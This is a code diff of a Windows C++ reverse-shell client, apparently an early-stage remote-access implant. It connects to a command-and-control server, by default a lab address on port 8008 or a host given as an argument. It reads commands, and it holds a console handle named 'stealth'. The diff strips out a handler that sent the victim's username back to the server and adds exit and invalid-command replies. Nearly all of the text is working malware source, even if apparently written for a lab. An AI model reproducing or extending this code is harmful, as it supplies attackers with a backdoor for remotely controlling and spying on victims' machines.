@@ -1,20 +1,14 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <ws2tcpip.h>
+#pragma comment(lib, "Ws2_32.lib")
 
 #include <stdio.h>
 
 // DEBUG, TEMP.
 #include <iostream>
 
-void whoami(char *returnval, int returnsize)
-{
-	DWORD bufferlen = 257;
-	// Call WINAPI method, assign it's response to returnval pointer.
-	GetUserName(returnval, &bufferlen);
-}
-
-void RevShell()
+void RevShell(char* C2Server, int C2Port)
 {
 	// WSADATA object - contains details of application state regarding to network
 	WSADATA wsaver;
@@ -27,8 +21,8 @@ void RevShell()
 	sockaddr_in addr;
 
 	addr.sin_family = AF_INET;
-	addr.sin_addr.s_addr = inet_addr("192.168.56.112");
-	addr.sin_port = htons(8008);
+	addr.sin_addr.s_addr = inet_addr(C2Server);
+	addr.sin_port = htons(C2Port);
 
 	// This if statement triggers if connection to C&C errored out.
 	if (connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr))==SOCKET_ERROR) {
@@ -48,36 +42,28 @@ void RevShell()
 			std::cout << "Command Received: " << CommandReceived;
 			std::cout << "Length of Command: " << Result << std::endl;
 			
-			// Command parsed as whoami (strpcmp makes comparsion with predefined string in this case)
-			if (strcmp(CommandReceived, "whoami\n") == 0) {
-				char buffer[257] = ""; // reserve buffer with length of 257 bytes
-				whoami(buffer,257); // call whoami function
-				strcat(buffer, "\n"); 
-				send(tcpsock, buffer, strlen(buffer)+1,0); // send response
-				// clear buffers
-				memset(buffer, 0, sizeof(buffer));
-				memset(CommandReceived, 0, sizeof(CommandReceived));
-			}
-			// Command parsed as pwd (strpcmp makes comparsion with predefined string in this case)
-			else if (strcmp(CommandReceived, "pwd\n") == 0) {
-				std::cout << "Command parsed: pwd" << std::endl;
-			}
-			else if (strcmp(CommandReceived, "exit\n") == 0) {
+			if (strcmp(CommandReceived, "exit\n") == 0) {
 				std::cout << "Command parsed: exit";
 				std::cout << "Closing connection..." << std::endl;
+				Sleep(1000);
+				exit(0);
 			}
 			else {
 				std::cout << "Command not parsed!" << std::endl;
+				char buffer[20] = "Invalid command\n";
+				send(tcpsock,buffer,strlen(buffer)+1,0);
+				memset(buffer, 0, sizeof(buffer));
+				memset(CommandReceived, 0, sizeof(CommandReceived));
 			}
 			memset(CommandReceived, 0, sizeof(CommandReceived));
-		}		
+		}
 	}
 	closesocket(tcpsock);
 	WSACleanup();
 	exit(0);
 }
 
-int main()
+int main(int argc, char **argv)
 {
 	// Window handle to work with Console window;
 	HWND stealth;
@@ -87,7 +73,17 @@ int main()
 	stealth = FindWindowA("ConsoleWindowClass", NULL);
 	ShowWindow(stealth, SW_SHOWNORMAL);
 
-	std::cout << "Work in progres..\n";
-	RevShell();
+	//std::cout << "Work in progres..\n";
+
+	if (argc == 3)
+	{
+		int port = atoi(argv[2]);
+		RevShell(argv[1],port);
+
+	} else {
+	char host[] = "192.168.56.112";
+	int port = 8008;
+	RevShell(host,port);
+	}
 	return 0;
 }
